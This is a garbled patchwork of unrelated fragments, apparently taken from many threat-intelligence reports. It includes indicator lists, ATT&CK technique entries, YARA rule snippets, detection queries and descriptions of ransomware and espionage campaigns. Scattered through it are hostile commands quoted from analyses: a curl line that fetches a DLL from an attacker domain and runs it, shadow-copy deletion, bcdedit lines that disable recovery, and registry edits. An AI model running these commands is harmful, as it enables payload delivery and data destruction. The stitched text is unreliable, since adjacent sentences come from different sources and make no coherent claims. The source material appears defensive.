5.62.60[.]202 (AS198605 AVAST Software s.r.o.) • 160.152.10[.]215 (AS37637 Smile-Nigeria-AS)• 197.244.250[.]155 (AS37705 TOPNET)• 169.159.92[.]36 (AS37122 SMILE)• 45.62.170[.]237 (AS396073 MAJESTIC-HOSTING-01)• 92.38.180[.]49 (AS202422 G-Core Labs S.A)• 129.56.36[.]26 (AS327952 AS-NATCOM)• 92.38.180[.]47 (AS202422 G-Core Labs S.A.)• 107.179.20[.]214 (AS397086 LAYER-HOST-HOUSTON)• 45.62.170[.]31 (AS396073 MAJESTIC-HOSTING-01)References[1] https://www.investing.com/academy/statistics/microsoft-facts/[2] https://intel471.com/blog/countering-the-problem-of-credential-theft[3]
So this will just pop a calculator under normal conditions.
Figure 2.
TA551 uses the Standard IcedID variant. 
It is also possible that this is not a new operation but rather a rebrand of a previous ransomware group that brought along their affiliates.
An example of the PowerShell script used for setting new Exchange connector and transport rulesSpam email campaign sent through Exchange connector The actor behind this attack has been actively running spam email campaigns for many years.
Before exiting, it pops up a message box informing the victim that the execution didn’t succeed. 
However, recent observations suggest that the group has shifted its collection efforts towards maritime-related information since December 2022.
The existence of a donate-over-proxy value and the usage of generic user and password values within the XMRig configuration reveal the usage of a mining proxy.
Disable Windows update services such as (“wuauserv”, “WaaSMedicSvc”, “UsoSvc”) 
Data Encoding: Standard Encoding T1132.001 TrickBot can Base64-encode C2 commands. 
Additional execution details include the following: Creating the HKCU\Software\Zeppelin registry key Appending an extension with the format A1A-A80-4CD to encrypted files Creating a file called README.txt.v-society Imphash: 8acb34bed3caa60cae3f08f75d53f727 Creating a temp file with a .Zeppelin extension using the following format - C:\Users\<User>\AppData\Local\Temp\7D3ED7F1.Zeppelin Conclusion School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors.
Headlong Intellectual+" fullword ascii $s12 = ">Certainty holes) cherries Proceeding Active+ surname Rex/ gets" fullword wide $s13 = "+Enthusiastic@ Couple?
Cobalt Strike found via memory analysis How can Cobalt Strike be detected and remediated? 
We haven’t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.
"net view /all >>
Chrome/108.0.0.0 Safari/537.36 URIs:/wp-content/themes/pressa/js/avias.js /wp-content/themes/pressa/js/mobile_menu.js /wp-content/plugins/contact-form-7/includes/js/scripts.js /wp-content/themes/pressa/js/bootstrap.js /wp-content/themes/pressa/js/hovermenu.js /wp-content/themes/pressa/js/retina-1.1.0.js /wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js /wp-content/themes/pressa/js/custom-script.js /wp-includes/js/wp-emoji-release.min.js /maps-api-v3/api/js/52/1/intl/uk_ALL/util.js /wp-includes/js/wp-embed.min.js The major features of Demon include: Enumerate host and network info (users, groups, domains, shares, etc.) 
A in ('dir /s /b
Command showing the use of "Bitsadmin" to transfer the Black Basta Ransomware: Connection from Client by threat actor: DISABLING ANTIVIRUS/MALWARE SOFTWARE USING ".BAT"
<REDACTED> /f reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
Reviewed by @kostastsale, @RoxpinTeddy, and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.
== 0x00004550 and pe.exports("PTOpenProviderEx") and not pe.exports("MergeAndValidatePrintTicketThunk") } EDR / SIEM To complement static hunting with Yara, Mandiant also recommends hunting for similar indicators of compromise in “process”, “imageload” or “filewrite” events of typical EDR logs.
Fake NK News login site The JavaScript code captures entered credentials by issuing an HTTP POST request to https[://]www.nknews[.]pro/ip/register/login[.]php and then redirects the user to the legitimate NK News site. 
$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' This line sets the value of the $url variable to the URL of the file to be downloaded. 
Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.
Text Document.txt Sysmon Copy Paste Collection EID 24: user: DOMAIN\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18 Indicators Atomic RDP Client Name: WIN-RRRU9REOK18 Ursnif Domains: denterdrigx.com superliner.top internetlines.in superstarts.top superlinez.top internetlined.com Ursnif IPs: 62.173.149.7 31.41.44.97 5.42.199.83 31.41.44.27 208.91.197.91 187.190.48.135 210.92.250.133 189.143.170.233 201.103.222.246 151.251.24.5 190.147.189.122 115.88.24.202 211.40.39.251 187.195.146.2 186.182.55.44 222.232.238.243 211.119.84.111 
These samples, first witnessed on Dec. 5 and 11, 2020, respectively, show the direct replacement of the known WatchDog C2 infrastructure with new C2 infrastructure.
S0260 InvisiMole
Table 3: Technical weakness identification techniques observed by CISA MITRE ID Name Observation T1288 Analyze Architecture and Configuration Posture CISA observed the cyber actors scanning a Federal Government agency for vulnerable web servers.
Test CrowdStrike next-gen AV for yourself.
Below, we’ll explore the most common attacks against DNS and review mitigation strategies to avoid them.
`wineventlog_security` EventCode=4663 object_file_path="\\REGISTRY\\MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | stats count min(_time) as firstTime max(_time) as lastTime by object_file_name object_file_path process_name
timeout 10 & curl perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D -s -d md -A cur1-agent -o %documents%\macroor.dll& %documents%\macroor.dll #1 perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D Also, we observed this group introduce a new Windows executable-type downloader at this time.
While examining this data, the I.R. team member became aware of the use of RDP by the Threat Actor by observing RDPClip.exe logging that looked, by definition, incredibly suspicious. 
Our research uncovered that the C2 test[.]softlemon[.]net is a Windows server running Internet Information Services (IIS). 
One domain with links to Zerobot was among several domains associated with DDoS-for-hire services seized by the FBI in December 2022. 
The default is two seconds.
Example of junk code created by the ProcessWorm loader, useful instructions are highlighted in yellow While executing its worm-like activity, the ProcessWorm injects itself into processes created by the process that are already infected with this component.
[PTsecurity] FunnySwitch sid: 11004815;1004814;11004813;11004812; SPYWARE
Figure 4.
If all conditions are satisfied and the host has SID S-1-5-32-544 present (Group Name: BUILTIN\Administrators), the script outputs “YES”.
1 Stopping Services Fig.
A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure. 
We had observed activity at the same target a few months prior, which we attributed to Gallium primarily based on the use of the group’s PingPull backdoor and TTPs. 
Shell"); sh[reverseString(ar(1))]("me\\123.com me/itsIt.db,"+reverseString(a The JS file was then executed with wscript.exe and used the provided command line arguments, which created and executed the following command using WScript.
It also needs a passcode to ensure that it is being used as intended.
It’s worth mentioning that in previous operations, the actors used SmadAV for their own purposes, forcing its component SmadAVprotect32.exe to side-load their malicious DLL. 
Defense Evasion Technique Title ID Use Valid Accounts: Domain Accounts T1078.002 During Phase II
NetSupport RAT, once installed, is very robust and powerful, and threat actors are able to masquerade the dropper or installer in any way they see fit.
Mandiant Badblood: TA453 Targets US & Israel in Credential Phishing.
After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.
On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.
They are digitally signed MSI files (see the Certificates section) created with Advanced Installer.
This is most likely a virtual private server (VPS) behind which the attacker has parked the actual command and control (C2) server, leaving us unable to identify the actual C2.
G0006 APT1
The threat actor updated the domain name to seroxen[.]net by the end of March.
Fig.4 RC4 decryption The decrypted payload is shown below.
In both cases, the target page is hosted on Zeplin, a legitimate service for collaboration between designers and developers, and requires logging in to view. 
The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.
Although such attacks may seem repetitive to the casual observer, threat actors would not continue to target taxpayers if previous attacks had not been successful. 
T1120Peripheral Device
REvil ransomware disappeared just a couple of months before Ransom Cartel surfaced and just one month after 14 of its alleged members were arrested in Russia.
Bypassing execution blocking After playing with some file extensions, it turns out that this protection is not bulletproof. 
Rule Set -----------------------------------------------------------------
The position-independent code constituting ScrambleCross can be loaded in one of two ways, the first being a C++ DLL named StealthVector.
Table 2 shows the three registry keys used by X4. 
All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity. 
The domains utilized also heavily use redacted “whois” information and obscure registration data.
S0245 BADCALL
Like many other ransomware gangs, Ransom Cartel leverages double extortion techniques.
In this case, the user had saved the file 3488164.iso to the their downloads folder and mounted it. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, and event logs including Sysmon under our Security Researcher and Organization services. 
30 Nov 2022 - 11:30AM 
The Abraham Accords can be an improvement in the region from a neutral point of view, but some may feel uneasy about these agreements.
The activity has overlap with what we call Operation In(ter)ception, a series of cyberespionage attacks that have been ongoing since at least September 2019.
The API returns a SERVER_INFO_101 structure that contains an sv101_type field.
Malspam delivers a LokiBot sample.
These affiliates are interviewed and vetted before being accepted into the RaaS group.
In a January 2023 interview, threat actors behind TargetCompany said that they choose only a small percentage of their victims to publish on their leak site.
According to reports from law enforcement agencies, the criminals behind the attack were able to infect more than 1,000 machines belonging to one bank in the same incident, which allowed them to clone 28,000 unique credit cards across Brazil. 
Its likely the code was reused from other open source pentest enumerations scripts available, such as: WMIC The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.
File Payload URL February 20-23, 2023 hxxp[://]94[.]131[.]11[.]141/webdav/fda[.]dll URL BAT Payload URL February 20-23, 2023 Recall_2.22.url filename .URL
Figure 11 The table below shows some of the targeted Chrome browser extensions that RedLine Stealer tries to parse to look for Crypto Wallets.
It just happens to be a malicious module.
DoubleZero wiper On March 22, 2022 CERT-UA reported a new wiper used against their infrastructure and enterprises.
Connect Connects to a given host via a socket and waits for the server to send data. 
Once the banking Trojan executes in the context of the parent process, it hooks process creation library functions and waits until the real target is created. 
Exchange Email Delegate Permissions [T1098.002] Create Account: Local Account [T1136.001] Office Application Startup: Office Test [T1137.002] Office Application Startup:
The second payload, with resource ID 6732, is a PE file.
Appendix A 
The threat actor generally embeds the next stages of the execution inside an additional file, usually an XML or a PDF file.
The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.
We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library. 
Educate employees on protecting themselves from threats like phishing/untrusted URLs. 
If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. 
Additional infection activityInstallation of the fake posts-layouts plugin is not the only thing that hackers do during the initial infection.
Remcos is a commercial software created by Breaking Security that, according to their user manual, can be used for remote control, remote admin, remote anti-theft, remote support and pentesting.[5]
Zoho ManageEngine affected by CVE-2022-47966:
The cyber actors used or modified public proof of concept code in order to exploit vulnerable systems. 
T1134.002Access Token Manipulation: Create Process with TokenFlowCloud can create processes using tokens acquired from legitimate processes. 
The falsified argument, which consists of a repeating string of the digit 1 based on the length of the real argument, rewritten in memory and replaced with the real argument, resulting in a unique execution: Figure 2 – Rorschach’s process tree spawns processes with falsified arguments. 
S0547 DropBook
After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. 
Targeted service list. 
Account Discovery: Email Account T1087.003 TrickBot collects email addresses from Outlook. 
REG_SZ /d
Figure 8.
[17] “NVD - CVE-2022-39197.”
Figure 11.
Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes. 
Port 443:"Spawn
SYS Malicious drivers reduce the token integrity of Microsoft defender (MsMpEng.exe) 28ca7a21de60671f3b528a9e08a44e1c 21F1CFD310633863BABAAFE7E5E892AE311B42F6 D5B4C2C95D9610623E681301869B1643E4E2BF0ADCA42EAC5D4D773B024FA442 The malware uses an open-source project called KDMapper to manually map non-signed/self-signed drivers in memory by exploiting the iqvw64e.sys Intel driver.
Domain Trust Discovery T1482 TrickBot can gather information about domain trusts by utilizing Nltest. 
That allows to bypass some monitoring in the situation if the system DLLs are hooked.
The unpacked malware is a binary file of 32 bits that can be found as an EXE file. 
Many exploits can be mitigated by applying available patches for vulnerabilities (such as CVE-2019-11510, CVE-2019-19781, and CVE-2020-5902) affecting external remote services. 
This is done in order to stay undetected on the system longer. 
Wibemax matches the name of a Pakistani software development company, but at this time we have not identified a clear relationship to the adversary. 
G1009 Moses Staff
T1095
In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.
Finally, the malware executes a command to delete itself from the system (T1070.004). 
In particular, we’ve noted that the PE shellcode loader in use is unique in our experience.
It loads and accesses the victim’s address book and contacts if they exist.
So it uses ExceptionInformantion[1] member of Exception Record to get this additional information about exception. 
Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.
Additionally, we could incorporate a special Canary Token within our script: Canary tokens are unique markers that are placed within systems or scripts to act as early warning indicators.
The TEARDROP dropper is a memory-only DLL that runs as a service spawning a thread that pulls the Cobalt Strike payload from a fake JPG file.
Once it’s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration. 
The phishing emails have similar topics and pretend to come from some of the same entities – for example, the Office of the Attorney General (Fiscalia General de la Nacion) or the National Directorate of Taxes and Customs (DIAN). 
S0629 RainyDay
This study on an active campaign delves into the structure, goals, and requirements of the organizations involved, and provides an opportunity to conduct wider intelligence analysis and insights in the development of effective countermeasures. 
To mitigate the risk, affected users are recommended to immediately uninstall the application and perform a full system scan to detect and remove any associated malware. 
We track this particular group as Earth Zhulong.
Detect: Network Traffic Analysis Administrative Network Activity Analysis
We contained and eradicated the threat from our client’s networks during incident response whilst our Managed Detection and Response (MDR) clients automatically received detection logic. 
They contain the same information: a curriculum vitae for the position of game developer or database manager at a St. Petersburg company. 
This Windows File May Be Secretly Hoarding Your Passwords And Emails (September 19, 2018) Windows machines that have handwriting recognition features enabled that translate stylus and touchscreen writing into formatted texts are susceptible to a Windows “WaitList.dat” file storing sensitive information, such as passwords, without the user’s knowledge.
93 46 F5 DC C5 18 Nvidia certificate 01 FD D0 93
Building the file name with PL shellcodeAmong all the loaders, we encountered three different shellcode payloads: Crosswalk Metasploit stager Cobalt Strike Beacon 2.3 Attack examples 2.3.1 An encrypted resume This malicious file is a RAR archive, electronic_resume.pdf.rar (025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596), with two files: Figure 20.
[T1098] on several hosts as a backup should the rogue domain administrator account get detected and terminated.
Incident #2 VPN access using Single Factor authentication. 
The key features of the malicious IronPython scripts are as follows: Function and variable names are obfuscated. 
S0262 QuasarRAT
T1328 Buy Domain Name CISA has observed the use of domains purchased by the threat actors. 
Use of typosquatting domains for C2 servers is typical of Winnti and has been described in a Kaspersky report. 
It also comes with the feature to generate reporting in which the attacking team or threat actor can continuously study and improve their campaigns. 
Common targets are small- to medium-size businesses, with no geographical focus apparent at this time.
We found those samples were uploaded on November 2021 and August 2022, meaning this stealer existed since at least late 2021. 
The start range of the exfiltrated file’s modification timestamp end String 2022-12-31 
G0019 Naikon
Refer to Appendix A: Chinese State-Sponsored Cyber Actors’ Observed Procedures for information on procedures affiliated with these tactics and techniques as well as applicable mitigations. 
Figure 3.
Signs of BEC include fraudulent wire transfer requests, as well as spam or phishing emails sent from a customer’s corporate domain.
Unit 42 Incident Response Data on LockBit 2.0 Cases handled by Unit 42 security consultants involving LockBit 2.0 since its appearance in June 2021 demonstrate shorter dwell times and less flexibility in negotiation in the beginning of FY 2022 (measured October-September) in comparison to the end of FY 2021.
After checking the Python assembly code of the sample, we found this tool is used to dump information from the victim’s Oracle database.
Linksys, MikroTik, NETGEAR, and TP-Link.
One interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help. 
"c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile ➝ C:\Windows\system32\cmd.exe /C
Checking the process privileges If the process successfully obtains elevated privileges, it proceeds to drop the files shown in Figure 26. Figure 26.
Enable PowerShell Logging including module logging, script block logging and transcription. 
Finally, Lizar’s Jumper32/Jumper64.dll plugin resembles the code within Domino Backdoor, which is able to load a payload using several different methods, with the required one specified using a command ID number. 
Four images were there for all to see: an email icon, screenshot from a game with Russian text, screenshot of the site of a game development company, and a screenshot of information about vulnerability CVE-2020-0796 from the Microsoft website. 
ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1): initial dropper – contains both 32-bit and 64-bit binaries of the next stage – the persistent loader – and installs the appropriate version to the compromised machine. 
SHADOWCOPY /nointeractive wmic.exe shadowcopy delete bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no Table 3:
Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.
They then proceeded to dump credentials from the LSASS process on the host.
AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.
